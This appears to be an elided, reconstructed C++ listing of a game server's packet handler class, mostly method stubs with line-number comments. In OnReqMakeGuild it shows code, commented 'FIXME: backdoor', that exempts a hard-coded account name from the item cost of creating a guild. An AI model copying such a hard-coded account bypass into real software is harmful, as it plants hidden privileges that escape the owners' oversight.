...
void CPCPacketHandler::OnClose(void) // line 170
{
...
int CPCPacketHandler::DispatchPacket(short Header, int packetSize) // line 1577-3055
{
...
void CPCPacketHandler::OnChat(int len) // line 3058-3165
{
...
void CPCPacketHandler::OnReqName(int packetSize)
{
...
void CPCPacketHandler::OnWhisper(int len)
{
...
void CPCPacketHandler::OnChatParty(int len) // lines 3168-3200
{
...
void CPCPacketHandler::OnReqCloseMCStore(int len)
{
...
void CPCPacketHandler::OnRegisterGuildEmblemImg(int len)
{
...
void CPCPacketHandler::OnReqHostileGuild(int len)
{
...
void CPCPacketHandler::OnReqAllyGuild(int packetSize)
{
...
void CPCPacketHandler::OnGuildChat(int packetSize) // line 10212-10250
{
...
void CPCPacketHandler::OnReqMakeGuild(int packetLen)
{
	...
	//FIXME: backdoor
	if( strncmp(m_pc->m_characterInfo.accountName, "savageox", sizeof(m_pc->m_characterInfo.accountName)) != 0 && !m_pc->CPC::ConsumeItemForSkill(714, 1) )
	{
	...
	if( strncmp(m_pc->m_characterInfo.accountName, "savageox", sizeof(m_pc->m_characterInfo.accountName)) )
...
void CPCPacketHandler::OnMailSend(int len)
{
...
void CPCPacketHandler::OnShortcutKey_Change(int len)
{
...
void CPCPacketHandler::OnBattleFieldChat(int len)
{
